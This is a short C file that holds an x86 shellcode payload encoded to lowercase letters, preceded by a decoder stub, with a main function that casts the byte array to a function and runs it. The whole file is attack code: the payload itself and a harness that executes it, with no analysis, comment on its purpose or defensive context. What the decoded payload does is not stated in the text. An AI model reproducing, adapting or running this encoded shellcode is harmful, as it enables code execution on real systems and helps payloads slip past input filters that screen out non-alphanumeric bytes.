
unsigned char alpha2_lower_shellcode[263]=
/* decoder start */
"\xeb\x1e\x5e\x8b\xfe\x33\xc9\x81\xe9\x1e\xff\xff\xff\xfc\xac\x2c"
"\x61\x86\xe0\xac\x2c\x61\xc0\xe4\x04\x02\xc4\xaa\xe2\xf0\xeb\x05"
"\xe8\xdd\xff\xff\xff"
/* shellcode start */
"\x64\x62\x6e\x63\x6c\x63\x64\x61\x67\x65\x69"
"\x6c\x62\x63\x69\x6c\x66\x63\x61\x6d\x69\x6c\x66\x63\x62\x6d\x69"
"\x6c\x65\x63\x61\x69\x69\x6c\x68\x63\x63\x61\x69\x6c\x62\x63\x69"
"\x61\x68\x6f\x61\x6d\x64\x64\x68\x66\x70\x63\x69\x6a\x6d\x68\x61"
"\x64\x68\x69\x64\x6d\x69\x6c\x66\x68\x68\x69\x61\x62\x6d\x63\x69"
"\x6c\x68\x6b\x63\x61\x61\x62\x6d\x68\x64\x62\x6f\x6e\x69\x6c\x64"
"\x65\x6b\x70\x61\x62\x6d\x67\x65\x66\x69\x62\x64\x6f\x65\x67\x67"
"\x62\x68\x65\x67\x62\x68\x66\x70\x63\x69\x62\x68\x6f\x61\x69\x65"
"\x66\x68\x69\x67\x6a\x68\x65\x68\x66\x6f\x6a\x69\x6c\x68\x6b\x63"
"\x65\x61\x62\x6d\x68\x67\x67\x69\x6c\x63\x6d\x67\x70\x69\x6c\x68"
"\x6b\x62\x6d\x61\x62\x6d\x68\x69\x6c\x68\x6d\x6b\x70\x70\x6d\x61"
"\x62\x6d\x68\x67\x69\x68\x63\x67\x6d\x67\x65\x61\x62\x67\x69\x67"
"\x70\x63\x61\x66\x68\x67\x70\x67\x69\x65\x69\x67\x66\x67\x6d\x67"
"\x6d\x69\x6a\x6f\x62\x70\x6f\x65\x6a\x61\x6c\x64\x62\x6d\x61\x66"
"\x62\x66\x61\x70\x70\x6e\x68";

int main(int argc, char **argv) {

	((void(*)(void))alpha2_lower_shellcode)();

}